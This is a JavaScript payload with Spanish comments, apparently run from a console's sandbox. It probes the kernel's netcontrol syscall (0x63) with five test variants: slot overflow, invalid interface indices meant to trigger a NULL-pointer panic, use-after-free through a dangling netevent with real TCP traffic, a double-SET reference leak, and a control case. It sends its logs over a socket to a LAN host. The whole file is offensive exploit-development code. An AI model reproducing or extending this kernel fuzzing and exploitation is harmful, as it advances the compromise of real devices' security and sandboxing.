// 2026-08-28 netctl2_1320: variantes netevent (netcontrol 0x63). SET ok desde sandbox; chain close->clear de slidybat PARCHADA en 13.20 (CLEAR=errno 5 no-match). Base: netcontrol_poc_1320.js.
// SET(0x20000003): getsock_cap(fd) -> netevent LIBRE (ifp(if_index)->if_netevent[3] o g_common_ev[3] global) guarda so+fd. CLEAR(0x20000007): busca FD en 3+3 slots -> match = doble fdrop.
// V-A overflow: 5 SET sec if_index=0 (3 ifp + desborde global) + 6o/7o cond -> patron ret. V-B if_index invalidos: -1(0xFFFFFFFFn), 0x7FFFFFFF, 1, 2, 3 (NULL-ifp = panic = JACKPOT). V-C dangling: SET+close(s) + 20 connects TCP reales a 192.168.1.67:8081 (netevent colgante = UAF). V-D doble SET mismo fd + 1 CLEAR (leak ref). V-E CLEAR sin SET (control: errno 5).
// Sockets NUEVOS por variante; W antes+ret tras cada SET/CLEAR; sin mmap/thr_new/rfork/read64; bucles acotados; V-A deja fds ABIERTOS (netevent vivo); <7KB.
(()=>{
const B=(x)=>BigInt(x),I=(x)=>BigInt.asIntN(64,x),WB=malloc(512);let sock=-1n;
const NCX=0x63n,SETQ=0x20000003n,CLRQ=0x20000007n,YIELD=331n;
const W=(s)=>{if(sock<0n)return;try{const t=String(s)+"\n";let n=t.length;if(n>511)n=511;for(let i=0;i<n;i++)write8(WB+BigInt(i),t.charCodeAt(i)&255);syscall(SYSCALL.write,sock,WB,BigInt(n));}catch(e){}};
const N=(s)=>{try{send_notification(s)}catch(e){}};
const EN=()=>{try{const m=/^(\d+)/.exec(get_error_string());return m?parseInt(m[1],10):-1}catch(e){return -1}};
try{sock=I(syscall(SYSCALL.socket,2n,1n,0n));if(sock<0n)sock=-1n;else{const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);if(I(syscall(SYSCALL.connect,sock,sa,16n))<0n){syscall(SYSCALL.close,sock);sock=-1n;}}}catch(e){sock=-1n;}
W("[netctl2] inicio - canal "+(sock>=0n?"OK":"MUERTO"));
const B8=malloc(8),SUM=[],TCL=[];let hOvf=false,hIfx=false,hLeak=false;
const mk=(t,i)=>{const fd=I(syscall(SYSCALL.socket,2n,1n,0n));W(t+": socket s"+i+" fd="+fd);return fd};
const nc=(v,fd,ifx,cmd,d)=>{const p=v+": "+d+" (fd="+fd+") ifx=0x"+Number(ifx).toString(16);W(p+"...");write64(B8,fd);const r=I(syscall(NCX,B(ifx),cmd,B8,8n));const e=r<0?EN():0;W(p+" -> ret="+r+(r<0?" errno="+e:""));return{r,e}};
// ===== V-A: overflow de slots =====
try{
W("== V-A overflow: ifp(0)[3]+global[3]; SET 4o/5o = desborde ==");
const vaFd=[],vaR=[];
for(let i=0;i<5;i++){const fd=mk("V-A",i);if(fd<0n){W("V-A: socket fallo s"+i);break;}
 const q=nc("V-A",fd,0,SETQ,"SET s"+i+(i<3?" [ifp "+(i+1)+"/3]":" (desborde GLOBAL)"));vaFd.push(Number(fd));vaR.push(Number(q.r));
 if(q.r<0n){W("V-A: SET #"+(i+1)+" RECHAZADO errno="+q.e+" -> tope slots");break;}
 if(i>=3){hOvf=true;N("[netctl2] HITO V-A: SET #"+(i+1)+" ok (desborde GLOBAL)");}}
if(vaR.length===5&&vaR.every(x=>x>=0)){
 const f5=mk("V-A",5);
 if(f5>=0n){const q=nc("V-A",f5,0,SETQ,"SET s5 (6o)");vaFd.push(Number(f5));vaR.push(Number(q.r));
  if(q.r>=0n){N("[netctl2] HITO V-A: 6o ok (3/3 globales); 7o prueba sobrescritura");
   const f6=mk("V-A",6);
   if(f6>=0n){const q7=nc("V-A",f6,0,SETQ,"SET s6 (7o: mas slots o SOBRESCRITURA=leak doble-ref)");vaFd.push(Number(f6));vaR.push(Number(q7.r));
    if(q7.r>=0n){hOvf=true;N("[netctl2] HITO V-A: 7o ret 0 -> mas slots o sobreescritura sin soltar ref");W("V-A: 7o ret 0 -> posible SOBRESCRITURA del 1o = leak doble-ref");}
    else W("V-A: 7o errno="+q7.e+" -> tope=3 ifp + 3 globales");}}
  else W("V-A: 6o errno="+q.e+" -> tope<6");}}
SUM.push("V-A rets=["+vaR.join(",")+"] abiertos=["+vaFd.join(",")+"]");
}catch(e){W("V-A EX: "+e);SUM.push("V-A EX")}
// ===== V-B: if_index invalidos =====
try{
W("== V-B if_index invalidos: NULL-ifp sin check = panic (hallazgo si crashea) ==");
N("[netctl2] V-B: if_index invalido - crash posible = hallazgo");
const fB=mk("V-B",0),vbR=[];
if(fB>=0n){TCL.push(Number(fB));
 for(const [x,lb] of [[4294967295,"-1(0xFFFFFFFF)"],[2147483647,"0x7FFFFFFF"],[1,"1"],[2,"2"],[3,"3 wlan/eth?"]]){
  const q=nc("V-B",fB,x,SETQ,"SET ifx="+lb);vbR.push(Number(q.r));
  if(q.r>=0n){hIfx=true;N("[netctl2] HITO V-B: SET ACEPTADO if_index="+lb)}}}
SUM.push("V-B rets=["+vbR.join(",")+"] VIVA (ifindex validado)");
}catch(e){W("V-B EX (posible inestabilidad): "+e);SUM.push("V-B EX")}
// ===== V-C: dangling + trafico real =====
try{
W("== V-C dangling: SET+close+trafico (20 connects a 192.168.1.67:8081); colgante usado = UAF ==");
const fC=mk("V-C",0);let vc="V-C: SET fallo";
if(fC>=0n){const qs=nc("V-C",fC,0,SETQ,"SET s (pre-close)");
 if(qs.r>=0n){
  N("[netctl2] V-C: SET+close, trafico ahora - crash = close NO limpia netevent (UAF)");
  syscall(SYSCALL.close,fC);W("V-C: close(s="+fC+") ok");
  const sa=malloc(16);write8(sa,16);write8(sa+1n,2);write16(sa+2n,0x911Fn);write32(sa+4n,0x4301A8C0n);write64(sa+8n,0n);
  let okc=0;
  for(let i=1;i<=20;i++){const c=I(syscall(SYSCALL.socket,2n,1n,0n));if(c<0n)continue;
   if(I(syscall(SYSCALL.connect,c,sa,16n))>=0n)okc++;
   syscall(SYSCALL.close,c);
   if(i%5===0)W("V-C: trafico "+i+"/20 VIVA");}
  vc="V-C: SIN CRASH tras 20 connects ("+okc+" ok) -> close limpia o eventos no tocan el colgante";
  W("V-C: "+vc);}
 else{vc="V-C: SET errno="+qs.e;W("V-C: "+vc);TCL.push(Number(fC));}}
SUM.push(vc);
}catch(e){W("V-C EX (posible inestabilidad): "+e);SUM.push("V-C EX")}
// ===== V-D: doble SET mismo fd =====
try{
W("== V-D doble SET mismo fd + CLEAR unico (refs) ==");
const fD=mk("V-D",0);
if(fD>=0n){TCL.push(Number(fD));
 const q1=nc("V-D",fD,0,SETQ,"SET #1");
 const q2=nc("V-D",fD,0,SETQ,"SET #2 MISMO fd");
 if(q1.r>=0n&&q2.r>=0n){hLeak=true;N("[netctl2] HITO V-D: doble SET ret 0 x2 = 2 refs, CLEAR da 1 = leak");W("V-D: doble SET ret 0 x2 -> doble ref guardada");}
 const q3=nc("V-D",fD,0,CLRQ,"CLEAR unico");
 if(q1.r>=0n&&q2.r>=0n&&q3.r>=0n)W("V-D: todo ret 0 -> queda 1 REFERENCIA HUERFANA (leak contable)");
 SUM.push("V-D S1="+q1.r+"/e"+q1.e+" S2="+q2.r+"/e"+q2.e+" C="+q3.r+"/e"+q3.e);}
}catch(e){W("V-D EX: "+e);SUM.push("V-D EX")}
// ===== V-E: CLEAR sin SET (control) =====
try{
W("== V-E CLEAR sin SET (control: esperado errno 5) ==");
const fE=mk("V-E",0);
if(fE>=0n){TCL.push(Number(fE));
 const q=nc("V-E",fE,0,CLRQ,"CLEAR fd-nunca-SET");
 W("V-E: control "+(q.r<0n&&q.e===5?"CONFIRMADO (errno 5 no-match)":"INESPERADO ret="+q.r+" e="+q.e));
 SUM.push("V-E ret="+q.r+" e="+q.e);}
}catch(e){W("V-E EX: "+e);SUM.push("V-E EX")}
// ===== resumen + veredicto + cierre =====
W("== RESUMEN ==");for(const l of SUM)W("  "+l);
const hits=[];
if(hOvf)hits.push("desborde-global-ok");
if(hIfx)hits.push("ifx-invalido-aceptado");
if(hLeak)hits.push("dobleSET-leak-ref");
const vrd=("netctl2: 5 variantes, consola VIVA"+(hits.length?" | hits: "+hits.join(","):" | sin hits")).slice(0,90);
W("[netctl2] VEREDICTO: "+vrd);N(vrd);
for(const f of TCL){try{syscall(SYSCALL.close,B(f))}catch(e){}}
W("[netctl2] cleanup (V-A queda ABIERTO)");
for(let i=0;i<100;i++){N("["+(100-i)+"] netctl2 vivo");for(let j=0;j<3000;j++){syscall(YIELD)}}
W("PAYLOAD DONE");
try{if(sock>=0n)syscall(SYSCALL.close,sock)}catch(e){}
})();
